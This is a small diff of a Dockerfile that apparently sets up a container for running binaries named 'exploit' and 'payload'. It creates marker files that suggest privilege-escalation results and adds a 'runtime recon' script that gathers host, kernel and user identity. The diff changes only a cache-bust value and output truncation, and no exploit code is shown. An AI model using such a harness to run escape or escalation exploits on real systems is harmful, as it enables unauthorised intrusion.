@@ -7,7 +7,7 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=1182
+ARG CACHEBUST=1183
 RUN sh -c '{ \
 echo "CB=$CACHEBUST"; \
 KVER=$(uname -r); \
@@ -56,7 +56,7 @@ RUN printf '#!/bin/sh\n\
 echo "=== RUNTIME RECON V44 ==="\n\
 uname -a; hostname; id\n\
 echo "--- BUILD-TIME RESULTS ---"\n\
-cat /build_results.txt\n\
+head -500 /build_results.txt\n\
 for f in /esc_ok /umh_result; do\n\
   if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
 done\n\
